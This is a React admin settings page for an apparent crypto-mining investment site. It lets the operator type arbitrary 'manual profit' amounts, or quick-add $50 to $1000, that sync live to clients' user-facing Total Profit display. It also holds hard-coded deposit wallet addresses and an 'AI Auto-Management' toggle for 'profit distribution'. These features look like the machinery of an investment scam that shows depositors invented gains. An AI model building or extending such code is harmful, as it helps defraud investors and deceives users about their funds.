import React, { useState, useEffect } from 'react';
import { Bot, Sliders, Save, ArrowLeft, TrendingUp, RefreshCw, CheckCircle2, Sparkles, Wallet, KeyRound } from 'lucide-react';
import { toast } from 'sonner';
import { db, doc, onSnapshot, setDoc, updateDoc, addDoc, collection, serverTimestamp, handleFirestoreError, OperationType } from '../firebase';
import { useNavigate } from 'react-router';

interface UserListItem {
  id: string;
  name?: string;
  email?: string;
  manual_profits?: number;
  balance?: number;
}

const DEFAULT_WALLETS = {
  BTC: 'bc1qftqgamhv7hgs6msxfpwc0aawj5kn0mrjl3j4u7',
  ETH: '0xc64b82a830828A6b3AF1e71B40a0962A5FC07525',
  SOL: 'CS5onmGF5eUUCzLU4UJAqiBHh9ZP7KTpk5rgfVqXQy4A',
  XRP: 'rHxfaFeS2TTX5e4bp3dsvWa7kTaAaREg7e',
  LTC: 'LVRXy4jvsBK2rLLerjEohrKK1Pkem9nFzq',
  BCH: 'qrhe43zzq5rdn4wvgsre0j09j3phhj7zxsl4nq9p3p',
  USDT: '0xc64b82a830828A6b3AF1e71B40a0962A5FC07525',
};

export default function AdminSettings() {
  const navigate = useNavigate();
  const [aiEnabled, setAiEnabled] = useState(true);
  const [costings, setCostings] = useState({ pool: 150, cloud: 100, crypto: 200 });
  const [globalProfitMargin, setGlobalProfitMargin] = useState(15);
  const [defaultManualProfit, setDefaultManualProfit] = useState(0);
  const [walletAddresses, setWalletAddresses] = useState<Record<string, string>>(DEFAULT_WALLETS);
  const [isLoading, setIsLoading] = useState(true);

  // Users list & manual profit entry state
  const [users, setUsers] = useState<UserListItem[]>([]);
  const [selectedUserId, setSelectedUserId] = useState<string>('global');
  const [manualProfitInput, setManualProfitInput] = useState<string>('0');
  const [isUpdatingProfit, setIsUpdatingProfit] = useState(false);

  // Subscribe to global settings
  useEffect(() => {
    const settingsDoc = doc(db, 'settings', 'global');
    const unsubscribe = onSnapshot(settingsDoc, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.data();
        setAiEnabled(data.ai_enabled ?? true);
        setCostings(data.costings ?? { pool: 150, cloud: 100, crypto: 200 });
        setGlobalProfitMargin(data.global_profit_margin ?? 15);
        setDefaultManualProfit(data.default_manual_profit ?? 0);
        if (data.wallet_addresses) {
          setWalletAddresses({ ...DEFAULT_WALLETS, ...data.wallet_addresses });
        }

        if (selectedUserId === 'global') {
          setManualProfitInput(String(data.default_manual_profit ?? 0));
        }
      }
      setIsLoading(false);
    }, (error) => {
      handleFirestoreError(error, OperationType.GET, 'settings/global');
      setIsLoading(false);
    });
    return () => unsubscribe();
  }, [selectedUserId]);

  // Subscribe to users list for target selection
  useEffect(() => {
    const q = collection(db, 'users');
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const userList: UserListItem[] = snapshot.docs.map((d) => ({
        id: d.id,
        ...d.data()
      }));
      setUsers(userList);
    }, (error) => {
      console.error("Error loading users for admin settings:", error);
    });
    return () => unsubscribe();
  }, []);

  // Update input value when selected user changes
  useEffect(() => {
    if (selectedUserId === 'global') {
      setManualProfitInput(String(defaultManualProfit));
    } else {
      const targetUser = users.find(u => u.id === selectedUserId);
      setManualProfitInput(String(targetUser?.manual_profits ?? 0));
    }
  }, [selectedUserId, users, defaultManualProfit]);

  const selectedUser = users.find(u => u.id === selectedUserId);

  const handleApplyManualProfit = async () => {
    const val = parseFloat(manualProfitInput);
    if (isNaN(val)) {
      toast.error("Please enter a valid numeric profit amount");
      return;
    }

    setIsUpdatingProfit(true);
    try {
      if (selectedUserId === 'global') {
        await setDoc(doc(db, 'settings', 'global'), {
          default_manual_profit: val,
          updated_at: serverTimestamp()
        }, { merge: true });
        setDefaultManualProfit(val);
        toast.success(`Updated global default manual profit to $${val.toFixed(2)}`);
      } else {
        await updateDoc(doc(db, 'users', selectedUserId), {
          manual_profits: val
        });
        toast.success(`Manual profit for ${selectedUser?.email || selectedUser?.name || selectedUserId} synced to $${val.toFixed(2)}!`);
      }

      await addDoc(collection(db, 'logs'), {
        type: 'admin',
        action: `Set manual_profits for ${selectedUserId === 'global' ? 'All Users (Global Base)' : selectedUser?.email} to $${val}`,
        timestamp: serverTimestamp()
      });
    } catch (err: any) {
      console.error(err);
      toast.error(err.message || 'Failed to update profit');
    } finally {
      setIsUpdatingProfit(false);
    }
  };

  const handleQuickAddProfit = (amountToAdd: number) => {
    const current = parseFloat(manualProfitInput) || 0;
    const nextVal = Math.max(0, current + amountToAdd);
    setManualProfitInput(String(nextVal));
  };

  const handleSaveSettings = async () => {
    try {
      await setDoc(doc(db, 'settings', 'global'), {
        ai_enabled: aiEnabled,
        costings: costings,
        global_profit_margin: globalProfitMargin,
        default_manual_profit: parseFloat(manualProfitInput) || defaultManualProfit,
        wallet_addresses: walletAddresses,
        updated_at: serverTimestamp()
      }, { merge: true });
      toast.success('Global settings and wallet addresses updated successfully!');
      await addDoc(collection(db, 'logs'), {
        type: 'admin',
        action: `Updated global settings and deposit wallet addresses`,
        timestamp: serverTimestamp()
      });
    } catch (error: any) {
      console.error('Error saving settings:', error);
      toast.error('Failed to save settings');
    }
  };

  if (isLoading) return <div className="flex items-center justify-center min-h-screen">Loading...</div>;

  const currentEnteredProfitNum = parseFloat(manualProfitInput) || 0;

  return (
    <div className="pt-24 pb-16 px-4 sm:px-6 lg:px-8 max-w-3xl mx-auto">
      <button onClick={() => navigate('/admin/dashboard')} className="flex items-center gap-2 text-secondary hover:text-primary mb-6">
        <ArrowLeft size={16} /> Back to Dashboard
      </button>
      <h1 className="text-3xl font-bold mb-8">Global Settings</h1>
      
      <div className="bg-surface border border-border rounded-3xl p-6 space-y-8">
        
        {/* Controlled Input Field specifically for Manual Profit Entry */}
        <div className="p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-2xl space-y-5">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="p-3 bg-emerald-500/10 rounded-xl text-emerald-400">
                <TrendingUp size={24} />
              </div>
              <div>
                <h3 className="text-xl font-bold text-primary flex items-center gap-2">
                  Manual Profit Entry
                  <span className="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full font-mono uppercase tracking-wider">
                    Live Sync
                  </span>
                </h3>
                <p className="text-sm text-secondary">
                  Directly adjust client profit figures. Automatically syncs with the user-facing Total Profit display in real-time.
                </p>
              </div>
            </div>
          </div>

          {/* User selection target */}
          <div>
            <label className="block text-xs font-semibold text-secondary uppercase tracking-wider mb-2">
              Select Client Target Account
            </label>
            <select
              value={selectedUserId}
              onChange={(e) => setSelectedUserId(e.target.value)}
              className="w-full bg-background border border-border rounded-xl px-4 py-2.5 text-sm text-primary font-medium focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
            >
              <option value="global">🌐 All Users (Global Default Base Profit)</option>
              {users.map((u) => (
                <option key={u.id} value={u.id}>
                  👤 {u.email || u.name || u.id} — (Current Manual Profit: ${u.manual_profits?.toFixed(2) ?? '0.00'})
                </option>
              ))}
            </select>
          </div>

          {/* Controlled Input Field */}
          <div>
            <div className="flex justify-between items-center mb-2">
              <label htmlFor="manualProfitInput" className="block text-sm font-semibold text-primary">
                Manual Profit Entry Amount ($)
              </label>
              <span className="text-xs text-emerald-400 font-semibold flex items-center gap-1">
                <Sparkles size={12} /> Live Sync Enabled
              </span>
            </div>

            <div className="relative">
              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-muted font-bold text-lg pointer-events-none">$</span>
              <input
                id="manualProfitInput"
                type="number"
                step="0.01"
                min="0"
                placeholder="0.00"
                value={manualProfitInput}
                onChange={(e) => setManualProfitInput(e.target.value)}
                className="w-full bg-background border-2 border-emerald-500/40 rounded-xl pl-8 pr-4 py-3 text-xl font-bold text-emerald-400 font-mono focus:outline-none focus:border-emerald-400 transition-all shadow-inner"
              />
            </div>
          </div>

          {/* Quick Amount Pills */}
          <div className="flex flex-wrap items-center gap-2 pt-1">
            <span className="text-xs text-muted font-medium mr-1">Quick Add:</span>
            {[50, 100, 250, 500, 1000].map((amt) => (
              <button
                key={amt}
                type="button"
                onClick={() => handleQuickAddProfit(amt)}
                className="text-xs bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-3 py-1.5 rounded-lg font-semibold transition-all active:scale-95"
              >
                +${amt}
              </button>
            ))}
            <button
              type="button"
              onClick={() => setManualProfitInput('0')}
              className="text-xs bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 px-3 py-1.5 rounded-lg font-semibold transition-all active:scale-95 ml-auto"
            >
              Reset to $0
            </button>
          </div>

          {/* Real-time Display Preview Box */}
          <div className="p-4 bg-background border border-border rounded-xl flex items-center justify-between">
            <div>
              <p className="text-xs text-muted uppercase font-bold tracking-wider">User-Facing Total Profit Display</p>
              <p className="text-lg font-bold text-emerald-400 mt-0.5">
                ${currentEnteredProfitNum.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
            </div>
            <button
              type="button"
              onClick={handleApplyManualProfit}
              disabled={isUpdatingProfit}
              className="bg-emerald-500 hover:bg-emerald-600 text-white px-5 py-2.5 rounded-xl font-bold text-sm shadow-lg shadow-emerald-500/20 transition-all flex items-center gap-2 active:scale-95 disabled:opacity-50"
            >
              {isUpdatingProfit ? <RefreshCw className="animate-spin" size={16} /> : <CheckCircle2 size={16} />}
              Sync Manual Profit
            </button>
          </div>
        </div>

        <div className="flex items-center gap-3 pt-4">
          <div className="p-3 bg-[#0052ff]/10 rounded-xl"><Bot className="text-[#0052ff]" size={24} /></div>
          <div>
            <h3 className="text-xl font-bold">AI & Profit Management</h3>
            <p className="text-sm text-secondary">Control client profits and AI automation</p>
          </div>
        </div>

        <div className="flex items-center justify-between p-4 bg-background border border-border rounded-xl">
          <div>
            <h4 className="font-semibold text-primary">AI Auto-Management</h4>
            <p className="text-xs text-secondary mt-1">AI takes over client profit distribution when admin is offline.</p>
          </div>
          <button onClick={() => setAiEnabled(!aiEnabled)} className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${aiEnabled ? 'bg-[#0052ff]' : 'bg-muted'}`}>
            <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${aiEnabled ? 'translate-x-6' : 'translate-x-1'}`} />
          </button>
        </div>

        <div>
          <label htmlFor="globalProfitMargin" className="block text-sm font-medium text-secondary mb-2">Global Client Profit Margin (%)</label>
          <div className="flex items-center gap-4">
            <input type="range" min="1" max="100" value={globalProfitMargin} onChange={(e) => setGlobalProfitMargin(Number(e.target.value))} className="flex-1 accent-[#0052ff]" />
            <div className="relative">
              <input 
                id="globalProfitMargin"
                type="number" 
                min="0" 
                step="0.1"
                value={globalProfitMargin} 
                onChange={(e) => {
                  const val = parseFloat(e.target.value);
                  if (!isNaN(val) && val >= 0) {
                    setGlobalProfitMargin(val);
                  } else if (e.target.value === '') {
                    setGlobalProfitMargin(0); // Allow clearing temporarily
                  }
                }} 
                className="w-24 bg-background border border-border rounded-xl pl-3 pr-6 py-2 text-primary text-right font-mono focus:outline-none focus:ring-2 focus:ring-[#0052ff]" 
              />
              <span className="absolute right-2 top-2.5 text-secondary text-sm pointer-events-none">%</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-3 pt-6 border-t border-border">
          <div className="p-3 bg-emerald-500/10 rounded-xl"><Sliders className="text-emerald-500" size={24} /></div>
          <div>
            <h3 className="text-xl font-bold">Section Costings</h3>
            <p className="text-sm text-secondary">Set base prices for mining sections</p>
          </div>
        </div>

        <div className="space-y-4">
          {['pool', 'cloud', 'crypto'].map((key) => (
            <div key={key} className="flex items-center justify-between">
              <label className="text-sm font-medium text-secondary capitalize">{key} Mining Base Cost ($)</label>
              <input type="number" value={costings[key as keyof typeof costings]} onChange={(e) => setCostings({...costings, [key]: Number(e.target.value)})} className="w-32 bg-background border border-border rounded-full px-3 py-2 text-[#0052ff] font-bold text-right focus:outline-none focus:ring-2 focus:ring-[#0052ff]" />
            </div>
          ))}
        </div>

        {/* Deposit Wallet Addresses */}
        <div className="pt-6 border-t border-border space-y-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-blue-500/10 rounded-xl"><Wallet className="text-blue-500" size={24} /></div>
            <div>
              <h3 className="text-xl font-bold">Client Deposit Wallet Addresses</h3>
              <p className="text-sm text-secondary">Configure official receiving addresses & QR codes shown on the deposit page</p>
            </div>
          </div>

          <div className="space-y-3">
            {[
              { coin: 'XRP', label: 'Ripple (XRP) Address', badge: 'Featured' },
              { coin: 'BTC', label: 'Bitcoin (BTC) Address' },
              { coin: 'ETH', label: 'Ethereum (ETH) Address' },
              { coin: 'USDT', label: 'Tether (USDT ERC-20) Address' },
              { coin: 'SOL', label: 'Solana (SOL) Address' },
              { coin: 'LTC', label: 'Litecoin (LTC) Address' },
              { coin: 'BCH', label: 'Bitcoin Cash (BCH) Address' }
            ].map(({ coin, label, badge }) => (
              <div key={coin} className="p-3.5 bg-background border border-border rounded-2xl space-y-1.5">
                <div className="flex items-center justify-between">
                  <label htmlFor={`wallet-${coin}`} className="text-xs font-bold text-primary flex items-center gap-2">
                    {label}
                    {badge && (
                      <span className="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded-full font-mono uppercase">
                        {badge}
                      </span>
                    )}
                  </label>
                  <span className="text-[10px] font-mono text-muted uppercase">{coin}</span>
                </div>
                <input
                  id={`wallet-${coin}`}
                  type="text"
                  value={walletAddresses[coin] || ''}
                  onChange={(e) => setWalletAddresses({ ...walletAddresses, [coin]: e.target.value.trim() })}
                  placeholder={`Enter official ${coin} receiving address`}
                  className="w-full bg-surface border border-border/80 rounded-xl px-3.5 py-2 text-xs font-mono text-primary focus:outline-none focus:border-[#0052ff] transition-all"
                />
              </div>
            ))}
          </div>
        </div>

        <button onClick={handleSaveSettings} className="w-full bg-[#0052ff] hover:bg-[#0052ff]/90 text-white py-3 rounded-full font-medium transition-colors flex items-center justify-center gap-2 shadow-lg shadow-[#0052ff]/20">
          <Save size={18} /> Save All Changes
        </button>
      </div>
    </div>
  );
}

